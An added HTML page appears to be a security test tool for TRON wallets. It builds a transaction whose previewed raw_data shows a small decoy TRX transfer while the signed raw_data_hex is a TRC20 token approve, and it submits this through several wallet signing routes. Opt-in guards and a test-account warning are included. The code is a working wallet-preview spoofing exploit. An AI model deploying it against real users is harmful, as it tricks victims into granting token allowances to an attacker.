@@ -1,0 +1,620 @@
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>TRON raw_data mismatch verifier</title>
+    <style>
+      :root {
+        color-scheme: light;
+        --bg: #f4f7f6;
+        --card: #fff;
+        --text: #17211f;
+        --muted: #66706d;
+        --line: #d9dfdc;
+        --teal: #087f78;
+        --teal-dark: #05655f;
+        --amber: #a26000;
+        --red: #b42318;
+        --soft-teal: #e3f5f1;
+        --soft-amber: #fff1d7;
+        --soft-red: #ffe7e3;
+        font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      }
+      * { box-sizing: border-box; }
+      body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--text); }
+      button, input, select, textarea { font: inherit; }
+      button {
+        min-height: 40px;
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        background: #fff;
+        color: var(--text);
+        cursor: pointer;
+        padding: 0 14px;
+      }
+      button:disabled { cursor: not-allowed; opacity: .55; }
+      button:hover:not(:disabled) { border-color: #98a5a1; }
+      button.primary { background: var(--teal); border-color: var(--teal); color: #fff; }
+      button.primary:hover:not(:disabled) { background: var(--teal-dark); }
+      .shell { width: min(1320px, calc(100vw - 32px)); margin: 0 auto; padding: 28px 0 36px; }
+      .topbar, .row, .heading, .checkbox-line { display: flex; align-items: center; }
+      .topbar { justify-content: space-between; gap: 18px; margin-bottom: 16px; }
+      .row { gap: 10px; flex-wrap: wrap; }
+      .eyebrow { margin: 0 0 4px; color: var(--teal); font-size: 12px; font-weight: 800; text-transform: uppercase; }
+      h1, h2, h3, p { margin-top: 0; letter-spacing: 0; }
+      h1 { margin-bottom: 0; font-size: clamp(28px, 4vw, 46px); line-height: 1; }
+      h2 { margin-bottom: 0; font-size: 18px; }
+      h3 { margin-bottom: 10px; font-size: 14px; }
+      .status { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; margin-bottom: 14px; }
+      .status div, .panel { border: 1px solid var(--line); border-radius: 8px; background: var(--card); }
+      .status div { min-width: 0; padding: 12px 14px; }
+      .status span { display: block; margin-bottom: 4px; color: var(--muted); font-size: 12px; }
+      .status strong { display: block; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+      .grid { display: grid; grid-template-columns: minmax(350px, .9fr) minmax(430px, 1.1fr); gap: 14px; align-items: start; }
+      .panel { padding: 16px; }
+      .heading { justify-content: space-between; gap: 12px; margin-bottom: 14px; }
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        min-height: 26px;
+        border-radius: 999px;
+        background: var(--soft-teal);
+        color: var(--teal-dark);
+        font-size: 12px;
+        font-weight: 700;
+        padding: 0 10px;
+        white-space: nowrap;
+      }
+      .badge.warn { background: var(--soft-amber); color: var(--amber); }
+      .badge.danger { background: var(--soft-red); color: var(--red); }
+      .badge.muted { background: #eef1f0; color: var(--muted); }
+      .fields { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px; }
+      label { display: grid; gap: 7px; min-width: 0; color: var(--muted); font-size: 12px; font-weight: 700; }
+      input, select, textarea {
+        width: 100%;
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        background: #fff;
+        color: var(--text);
+        outline: none;
+      }
+      input, select { min-height: 40px; padding: 0 10px; }
+      textarea { min-height: 260px; resize: vertical; padding: 10px; font: 12px/1.45 "SFMono-Regular", Consolas, Menlo, monospace; }
+      pre {
+        min-height: 185px;
+        margin: 0;
+        overflow: auto;
+        white-space: pre-wrap;
+        word-break: break-word;
+        font: 12px/1.5 "SFMono-Regular", Consolas, Menlo, monospace;
+      }
+      input:focus, select:focus, textarea:focus { border-color: var(--teal); box-shadow: 0 0 0 3px rgba(8,127,120,.14); }
+      .mt { margin-top: 12px; }
+      .compare { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px; }
+      .compare article { min-width: 0; border: 1px solid var(--line); border-radius: 8px; padding: 12px; }
+      .guard {
+        display: grid;
+        gap: 10px;
+        margin-top: 12px;
+        border: 1px solid #f1d7ad;
+        border-radius: 8px;
+        background: #fffaf1;
+        padding: 12px;
+      }
+      .checkbox-line { grid-template-columns: auto 1fr; gap: 8px; }
+      .checkbox-line input { width: 16px; min-height: 16px; }
+      .facts { display: grid; gap: 8px; margin-top: 12px; }
+      .fact { border-left: 3px solid var(--teal); background: #f8fbfa; padding: 9px 10px; font-size: 13px; }
+      .fact.warn { border-left-color: var(--amber); background: #fffaf1; }
+      .fact.danger { border-left-color: var(--red); background: #fff5f3; }
+      .artifact { margin-top: 14px; }
+      .artifact-grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; }
+      @media (max-width: 980px) {
+        .grid, .status, .compare, .artifact-grid { grid-template-columns: 1fr; }
+        .topbar { align-items: flex-start; flex-direction: column; }
+      }
+      @media (max-width: 620px) {
+        .shell { width: min(100vw - 20px, 1320px); padding-top: 18px; }
+        .fields { grid-template-columns: 1fr; }
+        .row, .topbar button { width: 100%; }
+        button { flex: 1 1 auto; }
+      }
+    </style>
+  </head>
+  <body>
+    <main class="shell">
+      <header class="topbar">
+        <div>
+          <p class="eyebrow">Security verifier</p>
+          <h1>TRON raw_data mismatch</h1>
+        </div>
+        <div class="row">
+          <button id="detectBtn" type="button">Detect</button>
+          <button id="connectBtn" type="button" class="primary">Connect</button>
+        </div>
+      </header>
+
+      <section class="status">
+        <div><span>Provider</span><strong id="providerStatus">not detected</strong></div>
+        <div><span>Account</span><strong id="accountStatus">not connected</strong></div>
+        <div><span>Network</span><strong id="networkStatus">unknown</strong></div>
+      </section>
+
+      <section class="grid">
+        <section class="panel">
+          <div class="heading">
+            <h2>Inputs</h2>
+            <span class="badge">manual action only</span>
+          </div>
+
+          <div class="fields">
+            <label>Decoy recipient <input id="decoyTo" autocomplete="off" placeholder="defaults to current account" /></label>
+            <label>Decoy TRX <input id="decoyTrx" inputmode="decimal" value="0.01" /></label>
+            <label>TRC20 contract <input id="tokenContract" autocomplete="off" placeholder="token contract address" /></label>
+            <label>Approve spender <input id="spender" autocomplete="off" placeholder="defaults to current account" /></label>
+            <label>Approve amount <input id="approveAmount" inputmode="numeric" value="1" /></label>
+            <label>Fee limit <input id="feeLimit" inputmode="numeric" value="100000000" /></label>
+          </div>
+
+          <label class="mt">
+            Wallet route
+            <select id="signRoute">
+              <option value="tronWebSign">tronWeb.trx.sign(transaction)</option>
+              <option value="requestSign">provider.request tron_signTransaction</option>
+              <option value="requestSend">provider.request tron_sendTransaction</option>
+              <option value="providerSend">provider.sendTransaction(transaction)</option>
+            </select>
+          </label>
+
+          <label class="mt">
+            Provider payload shape
+            <select id="requestShape">
+              <option value="object">params: { address, transaction }</option>
+              <option value="objectReverse">params: { transaction, address }</option>
+              <option value="arrayObject">params: [{ address, transaction }]</option>
+              <option value="arrayTx">params: [transaction]</option>
+            </select>
+          </label>
+
+          <div class="guard">
+            <label class="checkbox-line">
+              <input id="externalSpenderAck" type="checkbox" />
+              Allow spender different from connected account
+            </label>
+            <label>External spender unlock <input id="externalSpenderUnlock" autocomplete="off" placeholder="type ALLOW EXTERNAL SPENDER" /></label>
+            <label>Send route unlock <input id="sendRouteUnlock" autocomplete="off" placeholder="type ALLOW SEND ROUTE for sendTransaction routes" /></label>
+          </div>
+
+          <div class="row mt">
+            <button id="buildBtn" type="button">Build mismatch</button>
+            <button id="signBtn" type="button" class="primary">Open wallet popup</button>
+          </div>
+        </section>
+
+        <section class="panel">
+          <div class="heading">
+            <h2>Comparison</h2>
+            <span id="mismatchBadge" class="badge muted">not built</span>
+          </div>
+          <div class="compare">
+            <article>
+              <h3>Wallet preview source: raw_data</h3>
+              <pre id="decoySummary">Build a transaction first.</pre>
+            </article>
+            <article>
+              <h3>Signature source: raw_data_hex</h3>
+              <pre id="actualSummary">Build a transaction first.</pre>
+            </article>
+          </div>
+          <div id="facts" class="facts"></div>
+        </section>
+      </section>
+
+      <section class="panel artifact">
+        <div class="heading">
+          <h2>Artifacts</h2>
+          <div class="row">
+            <button id="copyTxBtn" type="button">Copy tx</button>
+            <button id="copySignedBtn" type="button">Copy signed</button>
+          </div>
+        </div>
+        <div class="artifact-grid">
+          <label>Mismatched transaction <textarea id="mismatchJson" readonly spellcheck="false"></textarea></label>
+          <label>Wallet result <textarea id="signedJson" readonly spellcheck="false"></textarea></label>
+          <label>Log <textarea id="logOutput" readonly spellcheck="false"></textarea></label>
+        </div>
+      </section>
+    </main>
+
+    <script>
+      const state = {
+        provider: null,
+        tronWeb: null,
+        account: "",
+        network: "unknown",
+        detections: [],
+        decoyTx: null,
+        actualTx: null,
+        mismatchedTx: null,
+        signedTx: null,
+        logs: []
+      };
+
+      const $ = (id) => document.getElementById(id);
+      const SELECTOR_APPROVE = "095ea7b3";
+      const NILE_USDT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
+
+      function clone(value) { return JSON.parse(JSON.stringify(value)); }
+      function asJson(value) {
+        if (value === undefined) return "";
+        try { return JSON.stringify(value, null, 2); } catch { return String(value); }
+      }
+      function log(message, detail) {
+        const body = detail === undefined ? "" : "\n" + asJson(detail);
+        state.logs.unshift("[" + new Date().toLocaleTimeString() + "] " + message + body);
+        render();
+      }
+      function errorText(error) {
+        if (!error) return "Unknown error";
+        if (typeof error === "string") return error;
+        if (error.message) return error.message;
+        return asJson(error);
+      }
+      function short(value, head = 12, tail = 8) {
+        const text = String(value || "");
+        return text.length <= head + tail + 3 ? text : text.slice(0, head) + "..." + text.slice(-tail);
+      }
+
+      function requestTip6963Provider() {
+        window.addEventListener("TIP6963:announceProvider", (event) => {
+          const detail = event.detail || {};
+          const info = detail.info || {};
+          if (info.rdns === "org.tronlink.www" || /tron/i.test(info.name || "")) {
+            state.provider = detail.provider;
+            state.tronWeb = detail.provider?.tronWeb || state.tronWeb;
+            detectProviders();
+            log("TIP-6963 provider announced", info);
+          }
+        });
+        try { window.dispatchEvent(new Event("TIP6963:requestProvider")); } catch {}
+      }
+
+      function detectProviders() {
+        const w = window;
+        const candidates = [
+          ["window.tron", w.tron],
+          ["window.tronLink", w.tronLink],
+          ["window.tronWeb", w.tronWeb],
+          ["window.trustwallet.tron", w.trustwallet?.tron],
+          ["window.trustWallet.tron", w.trustWallet?.tron],
+          ["window.bitkeep?.tronLink", w.bitkeep?.tronLink],
+          ["window.okxwallet?.tronLink", w.okxwallet?.tronLink]
+        ].filter(([, value]) => Boolean(value));
+
+        state.detections = candidates.map(([name, value]) => ({
+          name,
+          hasRequest: typeof value?.request === "function",
+          hasSendTransaction: typeof value?.sendTransaction === "function",
+          hasTronWeb: Boolean(value?.tronWeb),
+          ready: Boolean(value?.ready)
+        }));
+
+        state.provider =
+          w.tron ||
+          candidates.find(([, value]) => typeof value?.request === "function")?.[1] ||
+          candidates.find(([, value]) => typeof value?.sendTransaction === "function")?.[1] ||
+          w.tronLink ||
+          null;
+
+        state.tronWeb = w.tron?.tronWeb || w.tronWeb || w.tronLink?.tronWeb || state.provider?.tronWeb || null;
+        state.account = state.tronWeb?.defaultAddress?.base58 || state.provider?.selectedAddress || state.provider?.address || "";
+        state.network = detectNetwork();
+        applyDefaults();
+        render();
+      }
+
+      function detectNetwork() {
+        const host = state.tronWeb?.fullNode?.host || state.tronWeb?.fullNode?.node?.fullHost || state.tronWeb?.eventServer?.host || "";
+        const text = String(host);
+        if (/nile/i.test(text)) return "Nile (" + text + ")";
+        if (/shasta/i.test(text)) return "Shasta (" + text + ")";
+        if (/trongrid|mainnet/i.test(text)) return "Mainnet (" + text + ")";
+        return text || "unknown";
+      }
+
+      function applyDefaults() {
+        if (state.account) {
+          if (!$("decoyTo").value.trim()) $("decoyTo").value = state.account;
+          if (!$("spender").value.trim()) $("spender").value = state.account;
+        }
+        if (/nile/i.test(state.network) && !$("tokenContract").value.trim()) $("tokenContract").value = NILE_USDT;
+      }
+
+      async function connectWallet() {
+        detectProviders();
+        const targets = [state.provider, window.tron, window.tronLink, state.tronWeb].filter(Boolean);
+        let lastError = null;
+        for (const target of targets) {
+          if (typeof target.request !== "function") continue;
+          try {
+            await target.request({ method: "eth_requestAccounts" });
+            await wait(500);
+            detectProviders();
+            log("Wallet connected with eth_requestAccounts");
+            return;
+          } catch (error) { lastError = error; }
+          try {
+            await target.request({
+              method: "tron_requestAccounts",
+              params: { websiteName: "TRON mismatch verifier", websiteIcon: location.origin + "/favicon.ico" }
+            });
+            await wait(500);
+            detectProviders();
+            log("Wallet connected with tron_requestAccounts");
+            return;
+          } catch (error) { lastError = error; }
+        }
+        throw new Error("No usable wallet request API found. " + errorText(lastError));
+      }
+
+      function wait(ms) { return new Promise((resolve) => setTimeout(resolve, ms)); }
+      function trxToSun(value) {
+        const text = String(value).trim();
+        if (!/^\d+(\.\d{1,6})?$/.test(text)) throw new Error("Decoy TRX must be a decimal with up to 6 fractional digits.");
+        const [whole, fraction = ""] = text.split(".");
+        return Number(BigInt(whole) * 1000000n + BigInt(fraction.padEnd(6, "0")));
+      }
+      function integerText(id, label) {
+        const text = $(id).value.trim();
+        if (!/^\d+$/.test(text)) throw new Error(label + " must be an integer.");
+        return text;
+      }
+      function requireAddress(id, fallback, label) {
+        const value = $(id).value.trim() || fallback;
+        if (!value) throw new Error(label + " is required.");
+        return value;
+      }
+      function sameAddress(a, b) {
+        if (!a || !b) return false;
+        try {
+          const aw = state.tronWeb?.address?.toHex(a) || a;
+          const bw = state.tronWeb?.address?.toHex(b) || b;
+          return String(aw).toLowerCase() === String(bw).toLowerCase();
+        } catch {
+          return String(a).toLowerCase() === String(b).toLowerCase();
+        }
+      }
+      function validateGuards(spender) {
+        const route = $("signRoute").value;
+        const sendRoute = route === "requestSend" || route === "providerSend";
+        if (!sameAddress(spender, state.account)) {
+          const ok = $("externalSpenderAck").checked && $("externalSpenderUnlock").value.trim() === "ALLOW EXTERNAL SPENDER";
+          if (!ok) throw new Error("External spender requires checkbox plus exact phrase: ALLOW EXTERNAL SPENDER");
+        }
+        if (sendRoute && $("sendRouteUnlock").value.trim() !== "ALLOW SEND ROUTE") {
+          throw new Error("sendTransaction routes may broadcast. Type ALLOW SEND ROUTE to continue.");
+        }
+      }
+
+      async function buildMismatch() {
+        detectProviders();
+        const tronWeb = state.tronWeb;
+        if (!tronWeb?.transactionBuilder) throw new Error("Injected tronWeb.transactionBuilder was not found.");
+        const owner = state.account || tronWeb.defaultAddress?.base58;
+        if (!owner) throw new Error("Connect a TRON account first.");
+
+        const decoyTo = requireAddress("decoyTo", owner, "Decoy recipient");
+        const decoySun = trxToSun($("decoyTrx").value);
+        const tokenContract = requireAddress("tokenContract", "", "TRC20 contract");
+        const spender = requireAddress("spender", owner, "Approve spender");
+        const approveAmount = integerText("approveAmount", "Approve amount");
+        const feeLimit = Number(integerText("feeLimit", "Fee limit"));
+        validateGuards(spender);
+
+        const decoyTx = await tronWeb.transactionBuilder.sendTrx(decoyTo, decoySun, owner);
+        const triggerResult = await tronWeb.transactionBuilder.triggerSmartContract(
+          tokenContract,
+          "approve(address,uint256)",
+          { feeLimit, callValue: 0 },
+          [{ type: "address", value: spender }, { type: "uint256", value: approveAmount }],
+          owner
+        );
+
+        const actualTx = triggerResult.transaction || triggerResult;
+        if (!actualTx?.raw_data_hex || !actualTx?.raw_data) throw new Error("triggerSmartContract did not return raw_data/raw_data_hex.");
+
+        const mismatchedTx = clone(actualTx);
+        mismatchedTx.raw_data = clone(decoyTx.raw_data);
+        mismatchedTx.raw_data_hex = actualTx.raw_data_hex;
+        mismatchedTx.txID = actualTx.txID;
+        mismatchedTx.visible = false;
+        delete mismatchedTx.signature;
+
+        state.decoyTx = decoyTx;
+        state.actualTx = actualTx;
+        state.mismatchedTx = mismatchedTx;
+        state.signedTx = null;
+        log("Mismatched transaction built", {
+          txID: mismatchedTx.txID,
+          rawDataType: decoyTx.raw_data?.contract?.[0]?.type,
+          rawDataHexType: actualTx.raw_data?.contract?.[0]?.type,
+          triggerResult: triggerResult.result
+        });
+        render();
+      }
+
+      async function signMismatch() {
+        if (!state.mismatchedTx) await buildMismatch();
+        const tx = clone(state.mismatchedTx);
+        const route = $("signRoute").value;
+        validateGuards($("spender").value.trim() || state.account);
+        let result;
+        if (route === "tronWebSign") {
+          if (!state.tronWeb?.trx?.sign) throw new Error("tronWeb.trx.sign is unavailable.");
+          result = await state.tronWeb.trx.sign(tx);
+        } else if (route === "requestSign") {
+          result = await providerRequest("tron_signTransaction", tx);
+        } else if (route === "requestSend") {
+          result = await providerRequest("tron_sendTransaction", tx);
+        } else if (route === "providerSend") {
+          const provider = state.provider || window.tron;
+          if (typeof provider?.sendTransaction !== "function") throw new Error("provider.sendTransaction is unavailable.");
+          log("Calling provider.sendTransaction", { txID: tx.txID, rawDataType: tx.raw_data?.contract?.[0]?.type });
+          result = await provider.sendTransaction(tx);
+        } else {
+          throw new Error("Unknown route: " + route);
+        }
+        state.signedTx = normalizeSignedResult(result);
+        log("Wallet returned", result);
+        render();
+      }
+
+      async function providerRequest(method, tx) {
+        const provider = state.provider || window.tron || window.tronLink;
+        if (typeof provider?.request !== "function") throw new Error("provider.request is unavailable.");
+        const address = state.account || state.tronWeb?.defaultAddress?.base58 || "";
+        const shape = $("requestShape").value;
+        const payloads = {
+          object: { method, params: { address, transaction: tx } },
+          objectReverse: { method, params: { transaction: tx, address } },
+          arrayObject: { method, params: [{ address, transaction: tx }] },
+          arrayTx: { method, params: [tx] }
+        };
+        const payload = payloads[shape] || payloads.object;
+        log("Calling provider.request " + method, { shape, txID: tx.txID, rawDataType: tx.raw_data?.contract?.[0]?.type });
+        return provider.request(payload);
+      }
+
+      function normalizeSignedResult(result) {
+        if (!result) return result;
+        if (result.result && result.result.raw_data_hex) return result.result;
+        if (result.signedTransaction) return result.signedTransaction;
+        if (result.transaction?.raw_data_hex) return result.transaction;
+        if (result.raw_data_hex || result.txID || result.signature) return result;
+        return result.result || result;
+      }
+
+      function summarizeRaw(raw) {
+        const contract = raw?.contract?.[0];
+        const value = contract?.parameter?.value || {};
+        if (!contract) return "No contract found.";
+        if (contract.type === "TransferContract") {
+          return [
+            "type: TransferContract",
+            "owner: " + formatAddress(value.owner_address),
+            "to: " + formatAddress(value.to_address),
+            "amount_sun: " + value.amount,
+            "amount_trx: " + sunToTrx(value.amount),
+            "timestamp: " + (raw.timestamp || ""),
+            "expiration: " + (raw.expiration || "")
+          ].join("\n");
+        }
+        if (contract.type === "TriggerSmartContract") {
+          const data = value.data || "";
+          const lines = [
+            "type: TriggerSmartContract",
+            "owner: " + formatAddress(value.owner_address),
+            "contract: " + formatAddress(value.contract_address),
+            "selector: " + (data.slice(0, 8) || "none"),
+            "fee_limit: " + (raw.fee_limit || "")
+          ];
+          if (data.slice(0, 8) === SELECTOR_APPROVE && data.length >= 136) {
+            const spenderHex = "41" + data.slice(8 + 24, 8 + 64);
+            const amountHex = data.slice(8 + 64, 8 + 128);
+            lines.push("method: approve(address,uint256)");
+            lines.push("spender: " + formatAddress(spenderHex));
+            lines.push("amount: " + BigInt("0x" + amountHex).toString());
+          } else if (data) {
+            lines.push("calldata: " + data);
+          }
+          lines.push("timestamp: " + (raw.timestamp || ""));
+          lines.push("expiration: " + (raw.expiration || ""));
+          return lines.join("\n");
+        }
+        return ["type: " + contract.type, "type_url: " + (contract.parameter?.type_url || ""), asJson(value)].join("\n");
+      }
+
+      function formatAddress(value) {
+        if (!value) return "";
+        const text = String(value);
+        if (/^41[0-9a-fA-F]{40}$/.test(text)) {
+          try { return state.tronWeb?.address?.fromHex(text) || text; } catch { return text; }
+        }
+        return text;
+      }
+      function sunToTrx(value) {
+        try {
+          const sun = BigInt(String(value || 0));
+          const whole = sun / 1000000n;
+          const frac = String(sun % 1000000n).padStart(6, "0").replace(/0+$/, "");
+          return frac ? whole + "." + frac : String(whole);
+        } catch { return ""; }
+      }
+      function escapeHtml(value) {
+        return String(value)
+          .replaceAll("&", "&amp;")
+          .replaceAll("<", "&lt;")
+          .replaceAll(">", "&gt;")
+          .replaceAll('"', "&quot;")
+          .replaceAll("'", "&#039;");
+      }
+      function renderFacts() {
+        const facts = [];
+        if (state.mismatchedTx && state.decoyTx && state.actualTx) {
+          const rawLooksDecoy = asJson(state.mismatchedTx.raw_data) === asJson(state.decoyTx.raw_data);
+          const rawDiffers = asJson(state.mismatchedTx.raw_data) !== asJson(state.actualTx.raw_data);
+          const hexIsActual = state.mismatchedTx.raw_data_hex === state.actualTx.raw_data_hex;
+          facts.push({ text: "mismatched.raw_data === decoy.raw_data: " + rawLooksDecoy, type: rawLooksDecoy ? "" : "danger" });
+          facts.push({ text: "mismatched.raw_data !== actual.raw_data: " + rawDiffers, type: rawDiffers ? "warn" : "danger" });
+          facts.push({ text: "mismatched.raw_data_hex === actual.raw_data_hex: " + hexIsActual, type: hexIsActual ? "warn" : "danger" });
+          facts.push({ text: "txID from actual raw_data_hex: " + short(state.mismatchedTx.txID), type: "warn" });
+        }
+        $("facts").innerHTML = facts.map((fact) => '<div class="fact ' + (fact.type || "") + '">' + escapeHtml(fact.text) + "</div>").join("");
+      }
+      function render() {
+        const providerLabel = state.detections.length
+          ? state.detections.map((item) => item.name + (item.hasRequest ? " request" : "") + (item.hasSendTransaction ? " sendTx" : "")).join(" | ")
+          : "not detected";
+        $("providerStatus").textContent = providerLabel;
+        $("accountStatus").textContent = state.account || "not connected";
+        $("networkStatus").textContent = state.network || "unknown";
+        $("decoySummary").textContent = state.mismatchedTx ? summarizeRaw(state.mismatchedTx.raw_data) : "Build a transaction first.";
+        $("actualSummary").textContent = state.actualTx ? summarizeRaw(state.actualTx.raw_data) : "Build a transaction first.";
+        const built = Boolean(state.mismatchedTx);
+        $("mismatchBadge").textContent = built ? "mismatch ready" : "not built";
+        $("mismatchBadge").className = built ? "badge warn" : "badge muted";
+        $("mismatchJson").value = state.mismatchedTx ? asJson(state.mismatchedTx) : "";
+        $("signedJson").value = state.signedTx ? asJson(state.signedTx) : "";
+        $("logOutput").value = state.logs.join("\n\n");
+        renderFacts();
+      }
+      async function runButton(id, task) {
+        const button = $(id);
+        const text = button.textContent;
+        button.disabled = true;
+        button.textContent = "Working...";
+        try { await task(); } catch (error) { log("Error", errorText(error)); }
+        button.disabled = false;
+        button.textContent = text;
+        render();
+      }
+      async function copyText(text, label) {
+        if (!text) return log(label + " is empty");
+        await navigator.clipboard.writeText(text);
+        log(label + " copied");
+      }
+
+      $("detectBtn").addEventListener("click", () => { detectProviders(); log("Provider detection refreshed", state.detections); });
+      $("connectBtn").addEventListener("click", () => runButton("connectBtn", connectWallet));
+      $("buildBtn").addEventListener("click", () => runButton("buildBtn", buildMismatch));
+      $("signBtn").addEventListener("click", () => runButton("signBtn", signMismatch));
+      $("copyTxBtn").addEventListener("click", () => copyText($("mismatchJson").value, "Mismatched transaction"));
+      $("copySignedBtn").addEventListener("click", () => copyText($("signedJson").value, "Wallet result"));
+
+      requestTip6963Provider();
+      detectProviders();
+      log("Verifier loaded. Use a test account or spender equal to your own account.");
+    </script>
+  </body>
+</html>
